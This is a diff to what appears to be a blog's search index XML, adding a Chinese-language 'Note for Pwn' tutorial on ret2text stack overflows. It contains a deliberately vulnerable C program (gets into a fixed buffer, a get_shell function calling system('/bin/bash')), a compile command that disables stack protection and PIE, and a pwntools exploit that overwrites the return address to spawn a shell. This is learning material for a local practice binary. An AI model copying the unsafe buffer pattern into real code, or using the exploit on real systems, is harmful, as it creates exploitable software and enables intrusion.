@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Note for Pwn</title>
+      <link href="/2023/04/15/Note%20for%20Pwn/"/>
+      <url>/2023/04/15/Note%20for%20Pwn/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Note-for-Pwn"><a href="#Note-for-Pwn" class="headerlink" title="Note for Pwn"></a>Note for Pwn</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>先写个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stack_overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">// scanf(&quot;%s&quot;, &amp;buf);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    stack_overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie stack_overflow.c -o stack_overflow</span><br></pre></td></tr></table></figure><p>丢进IDA看一下</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304152253994.png" alt="50F1F928D43BE49F01CD4E0260D84C84"></p><p>这里找到<code>get_shell</code>函数的地址是<code>0x004005EB</code>，接下来我们要想办法让eip跳去这个地址，接下来我们去找栈是什么样子的</p><p><img src="/Users/dawn_whisper/Library/Containers/com.tencent.qq/Data/Library/Caches/Images/5A5E882BF2589AA202CE4EFACF2FA4C9.png" alt="5A5E882BF2589AA202CE4EFACF2FA4C9"></p><p>，这里看到，程序读到<code>v1</code>，距离rbp栈顶0x40距离，我们把这个地方和后边的rbp占掉，所以<code>v1</code>到我们要更改的ret的距离是0x40+0x8，所以exp即为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./stack_overflow&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x004005EB</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>) + p64(shell_addr) + p64(shell_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>XCTF Fianl 7th 祭</title>
       <link href="/2023/03/31/XCTF%20Fianl%207th%20%E7%A5%AD/"/>
       <url>/2023/03/31/XCTF%20Fianl%207th%20%E7%A5%AD/</url>
